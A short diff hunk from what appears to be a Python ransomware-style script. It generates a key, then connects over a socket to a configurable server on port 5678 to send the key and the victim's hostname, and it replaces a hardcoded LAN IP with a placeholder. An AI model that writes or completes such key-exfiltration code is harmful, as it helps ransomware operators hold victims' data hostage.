@@ -64,7 +64,7 @@ print("Key Generated!!!")
 
 
 #connect to server to transfer key and hostname
-ip_address = '192.168.15.105'
+ip_address = #here enter you wifi lan adapter ip address like this: '23.23.23.23'
 port = 5678
 tim = datetime.now()
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM)as s:
